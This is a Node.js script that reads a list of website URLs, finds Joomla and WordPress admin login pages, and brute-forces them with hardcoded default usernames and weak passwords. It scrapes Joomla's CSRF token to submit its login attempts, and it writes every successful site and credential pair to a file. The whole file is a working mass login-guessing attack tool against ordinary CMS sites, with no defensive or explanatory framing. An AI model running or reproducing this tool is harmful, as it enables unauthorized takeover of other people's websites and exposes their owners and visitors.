var request = require('request');
request = request.defaults({ jar: true });
var fs = require('fs');
var urllist = fs.readFileSync('urls.txt', 'utf8');
console.log('Processing: \n' + urllist);
var listurls = urllist.split("\r");
listurls.forEach(function(url) {
    url = url.trim();
    if (!url.startsWith("http"))
        url = "http://" + url;
    var usrs = ['demo', 'admin', 'administrator', 'user'];
    var pwds = ['demo', 'admin', '123456', 'admin123', 'abcdef', 'admin1', '12345678', '1234567890', '123!abc.'];

    //Joomla
    request.get({ uri: url + "/administrator/" }, function(error, response, html) {
        if (error) console.log('error: ' + error)
        if (response && response.statusCode == "200") {
            /*var usrs = ['demo', 'admin', 'administrator', 'user'];
            var pwds = ['demo', 'admin', '123456', 'admin123', 'abcdef', 'admin1'];*/
            m = html.match(/value="([a-zA-Z0-9]{12})/i);
            if (m == null)
                return;
            m = html.match(/name="([a-zA-Z0-9]{32})/i);
            if (m == null)
                return;
            usrs.forEach(function(u) {
                pwds.forEach(function(p) {
                    request.get({ uri: url + "/administrator/" }, function(error1, response1, html1) {
                        if (error1) console.log(error1);
                        if (html1)
                            processJoomla(url + "/administrator/", html1, u, p);
                    });
                });
            });
        }
    });

    //Wordpress
    request.get({ uri: url + "/wp-admin" }, function(error, response, html) {
        /*console.log(url + "/wp-admin");
        console.log('error: ' + error);
        console.log('statusCode:', response && response.statusCode);*/
        if (error) console.log('error: ' + error)
        if (response && response.statusCode == "200") {
            usrs.forEach(function(u) {
                pwds.forEach(function(p) {
                    /*request.get({ uri: url + "/wp-login.php" }, function(error1, response1, html1) {
                        processJoomla(url + "/wp-login.php", html1, u, p);
                    });*/
                    processWordpress(url + "/wp-login.php", u, p);
                });
            });
        }
    });

});

function processWordpress(jurl, usr, pwd) {
    var formdata = { rememberme: 0, log: usr, pwd: pwd };
    request.post({
        followAllRedirects: true,
        url: jurl,
        form: formdata
    }, function(error, response, html) {
        if ((response && response.statusCode == "200") && html.indexOf("Log Out</a>") > 0) {
            fs.appendFile('successurls.txt', 'Wordpress: ' + jurl + "\nUser: " + usr + "\nPass: " + pwd + "\n\n", function(err) { if (err) console.log('error: ' + err) });
        }
    });
}

function processJoomla(jurl, jhtml, usr, pwd) {
    //Process Text to get token and return value
    //var match = jhtml.match(/<input type="hidden" name="return" value="([a-zA-Z0-9]{12})">.+?<input type="hidden" name="([a-zA-Z0-0]{32})" value="1">/i);
    m = jhtml.match(/value="([a-zA-Z0-9]{12})/i);
    if (m == null)
        return;
    jreturn = m[1];
    m = jhtml.match(/name="([a-zA-Z0-9]{32})/i);
    if (m == null)
        return;
    jtoken = m[1];

    //Continue with form
    var formdata = { option: 'com_login', task: 'login', return: jreturn, username: usr, passwd: pwd };
    formdata[jtoken] = 1;
    request.post({
        followAllRedirects: true,
        url: jurl,
        form: formdata
    }, function(error, response, html) {
        if ((response && response.statusCode == "200") && html.indexOf("Logout</a>") > 0) {
            fs.appendFile('successurls.txt', 'Joomla: ' + jurl + "\nUser: " + usr + "\nPass: " + pwd + "\n\n", function(err) { if (err) console.log('error: ' + err) });
        }
    });

}